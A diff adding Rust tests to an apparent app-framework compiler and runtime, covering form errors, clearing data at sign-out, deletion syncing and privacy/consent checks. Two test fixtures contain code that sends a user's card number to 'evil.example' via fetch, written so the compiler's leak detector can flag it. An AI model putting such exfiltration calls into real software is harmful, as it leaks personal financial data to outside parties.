@@ -2360,6 +2360,29 @@ fn a_form_keeps_drafts_shows_errors_at_their_field_and_sends_once() {
 }
 
 #[test]
+fn a_form_shows_every_error_and_forgets_the_last_person_at_sign_out() {
+    let ui = |id: &str, event: &str, value: Json| Input::Ui { target: Target::Id { id: id.into() }, event: event.into(), value, reply: None };
+    let form = |device: &Runtime| device.inspect()["objects"].as_array().unwrap().iter().find(|o| o["object"] == "Form/profile").map(|o| o["state"].clone());
+    // An error about a field the form does not show goes to the form.
+    let src = PROFILE.replace("validName(f.value(\"name\", me.name))", "check(false, \"profile\", \"Save your profile first\")");
+    let (mut device, _) = boot_as(&src, Shared::default(), 0.0, false);
+    device.handle(0.5, Input::Identity { user: Some("user:ana".into()), roles: Vec::new() });
+    let out = device.handle(1.0, ui("save", "onPress", Json::Null));
+    assert!(format!("{out:?}").contains("Save your profile first") && format!("{out:?}").contains("form-error"), "{out:?}");
+
+    // Ana sends, then signs out before the answer: Bo sees nothing of hers.
+    let (mut device, _) = boot_as(PROFILE, Shared::default(), 0.0, false);
+    device.handle(0.5, Input::Identity { user: Some("user:ana".into()), roles: Vec::new() });
+    device.handle(1.0, ui("name", "onChange", json!("Ana")));
+    let out = device.handle(1.1, ui("save", "onPress", Json::Null));
+    assert!(out.iter().any(|o| matches!(o, Output::Effect { effect: Effect::Call { .. }, .. })), "{out:?}");
+    let out = device.handle(2.0, Input::Identity { user: Some("user:bo".into()), roles: Vec::new() });
+    let shown: Vec<&Output> = out.iter().filter(|o| matches!(o, Output::Patch { .. } | Output::Changed { .. } | Output::Error { .. })).collect();
+    assert!(!format!("{shown:?}").contains("user:ana"), "nothing of hers on screen or saved: {shown:?}");
+    assert!(form(&device).is_none_or(|f| f["error"] == json!("") && f["drafts"] == json!({})), "{:?}", form(&device));
+}
+
+#[test]
 fn a_persons_own_data_goes_back_only_into_their_own_objects() {
     let msg = |src: &str| compile(src).err().map(|e| e.iter().map(|d| d.message.clone()).collect::<Vec<_>>().join("
 ")).unwrap_or_default();
@@ -2380,6 +2403,22 @@ function App() {{
 }}
 "));
     assert!(e.contains("may be about someone other than the owner"), "{e}");
+}
+
+#[test]
+fn the_privacy_check_follows_tj_ui_and_the_apps_own_components() {
+    let msg = |src: &str| compile(src).err().map(|e| e.iter().map(|d| d.message.clone()).collect::<Vec<_>>().join("\n")).unwrap_or_default();
+    let account = "@server @read(\"owner\") object Account {\n  @pii(\"financial\", \"billing\") card: string = \"\"\n  @pii(\"contact\", \"account\") email: string = \"\"\n";
+    // Through a form's drafts, personal data is still personal data.
+    let e = msg(&format!("import {{ Form }} from \"tj:ui\"\n{account}  @allow(\"owner\") async leak() {{\n    const f = Form.get(\"x\")\n    f.set(\"c\", this.card)\n    await fetch(\"https://evil.example/?c=\" + f.value(\"c\", \"\"))\n  }}\n}}\n"));
+    assert!(e.contains("reaches `Form.drafts`"), "{e}");
+    // A component is followed with the props it is given.
+    let e = msg(&format!("{account}}}\nfunction Leak(p: {{ c: string }}) {{\n  fetch(\"https://evil.example/\" + p.c)\n  return <Text>x</Text>\n}}\nfunction App() {{\n  const me = Account.get(caller.id)\n  return <Leak c={{me.card}} />\n}}\n"));
+    assert!(e.contains("Account.card"), "{e}");
+    // tj:ui is the app's own code, not a third party.
+    let src = format!("import {{ Notice }} from \"tj:ui\"\nconst lawfulBasis = {{ billing: \"contract\", account: \"contract\" }}\n{account}  @allow(\"owner\") note(): any {{ return Notice({{ text: reveal(this.email, \"account\") }}) }}\n}}\n");
+    assert_eq!(msg(&src), "");
+    assert!(tj_core::facts(&src).transfers.is_empty(), "no transfer to tj:ui");
 }
 
 #[test]
@@ -2713,8 +2752,41 @@ fn a_deleted_object_leaves_its_class_its_replicas_and_its_timers() {
     let out = device.handle(1.0, Input::Sync { object: "Slot/s9".into(), state: json!({ "title": "Beard" }), seq: Some(3) });
     assert!(format!("{out:?}").contains("Beard"), "{out:?}");
     device.handle(2.0, Input::Sync { object: "Slot/s9".into(), state: Json::Null, seq: Some(4) });
-    let (_, out) = boot_as(&src, kept, 3.0, false);
+    let (mut device, out) = boot_as(&src, kept, 3.0, false);
     assert!(!format!("{out:?}").contains("Beard"), "a deleted replica is not kept: {out:?}");
+    // A deletion of something the device never held loads nothing.
+    device.handle(4.0, Input::Sync { object: "Slot/zz".into(), state: Json::Null, seq: Some(9) });
+    assert!(!device.inspect().to_string().contains("Slot/zz"));
+
+    // Deleted while already at its defaults: replicas still hear of it.
+    let (mut rt, _) = boot_as(note, Shared::default(), 0.0, true);
+    call_as(&mut rt, 1.0, "Note/user:ana", "write", json!(["hi"]), who("user:ana", &[])).unwrap();
+    call_as(&mut rt, 2.0, "Note/user:ana", "write", json!([""]), who("user:ana", &[])).unwrap();
+    let out = rt.handle(3.0, Input::Call { object: "Note/user:ana".into(), method: "drop".into(), args: Vec::new(), reply: Some(1), call: None, caller: who("user:ana", &[]) });
+    assert!(out.iter().any(|o| matches!(o, Output::Changed { state: Json::Null, .. })), "{out:?}");
+
+    // Erased by retention while not loaded: replicas hear of it as a deletion too.
+    let kept = Shared::default();
+    let (mut rt, _) = boot_as(note, kept.clone(), 0.0, true);
+    call_as(&mut rt, 1.0, "Note/user:ana", "write", json!(["hi"]), who("user:ana", &[])).unwrap();
+    let (mut rt, _) = boot_as(note, kept, 2.0, true);
+    let mut out = Vec::new();
+    for t in [86_400_100.0, 86_400_110.0, 86_400_120.0] {
+        out.extend(rt.handle(t, Input::Tick));
+    }
+    assert!(out.iter().any(|o| matches!(o, Output::Changed { object, state: Json::Null, .. } if object == "Note/user:ana")), "{out:?}");
+}
+
+#[test]
+fn personal_data_shown_to_other_readers_stays_one_persons_and_needs_no_consent() {
+    let msg = |src: &str| compile(src).err().map(|e| e.iter().map(|d| d.message.clone()).collect::<Vec<_>>().join("\n")).unwrap_or_default();
+    // On a shared object, a person's field would be out of reach of export and erasure.
+    let e = msg("@server @read(\"staff\") object Slot {\n  @pii(\"contact\", \"booking\") @read(\"staff\") phone: string = \"\"\n}\n");
+    assert!(e.contains("one person's data, so its readers include \"owner\""), "{e}");
+    // Held only with consent: shown to others only through reveal, where consent is checked.
+    let consented = "const lawfulBasis = { marketing: \"consent\" }\n@server @read(\"owner\", \"staff\") object Member {\n  @pii(\"contact\", \"marketing\") @read(\"owner\", \"staff\") email: string = \"\"\n}\n";
+    assert!(msg(consented).contains("rests on consent"), "{}", msg(consented));
+    assert_eq!(msg(&consented.replace("\"consent\"", "\"contract\"")), "");
 }
 
 #[test]
